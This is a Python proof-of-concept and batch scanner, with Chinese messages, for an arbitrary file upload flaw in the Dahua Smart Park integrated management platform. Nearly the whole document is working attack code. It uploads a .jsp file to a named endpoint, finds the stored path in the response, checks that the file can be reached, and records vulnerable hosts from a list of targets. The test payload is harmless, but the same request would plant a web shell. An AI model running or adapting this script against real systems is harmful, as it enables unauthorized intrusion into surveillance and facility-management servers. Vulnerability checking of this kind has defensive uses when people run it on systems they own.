import requests
import argparse
import re
from tqdm import tqdm
from time import sleep


def main(url, timeout=2):
    if not url.startswith("http://") and not url.startswith("https://"):
        url = "http://" + url
    data = url
    poc = "/publishing/publishing/material/file/video"
    url = data + poc
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15',
    }

    files = {
        'Filedata': ('Test.jsp', 'Test'),
        'Submit': (None, 'submit'),
    }
    try:
        response = requests.post(url, headers=headers,
                                 files=files, timeout=timeout)

        response_text = response.text

        matches = re.findall(r'"path":"(.*?)"', response_text)
        if matches:
            for path_value in matches:
                url1 = data + "/publishingImg/" + path_value
                try:
                    response1 = requests.get(
                        url=url1, headers=headers, timeout=timeout)
                    if response1.text in "Test":
                        print("[+]漏洞存在", url1)
                        with open("data.txt", "a") as f:
                            f.write(url1 + "\n")
                except requests.exceptions.RequestException as e1:
                    print(f"[-]漏洞不存在，无法访问 {url1}")
        else:
            print("[-]漏洞不存在\n")
    except requests.exceptions.RequestException as e:
        print(f"[-]漏洞不存在，无法访问 {url}")


if __name__ == "__main__":
    print("欢迎使用大华智慧园区综合管理平台任意文件上传漏洞检测工具！")
    print("-----------------------------------------------------------")
    print("微信公众号:知攻善防实验室!!")
    print("-----------------------------------------------------------")
    parser = argparse.ArgumentParser(description="检测URL是否存在漏洞")
    parser.add_argument("-u", "--url", required=False, help="需要检测的URL")
    parser.add_argument("-f", "--file", required=False, help="包含多个URL的文件路径")
    args = parser.parse_args()
    if args.file:
        with open(args.file, 'r') as f:
            file = [line.strip() for line in f.readlines()]
    elif args.url:
        file = [args.url]
    else:
        print("请在添加 -h 获取提示信息！!!")
        exit()

    for url in tqdm(file, desc="\n总进度"):
        main(url)
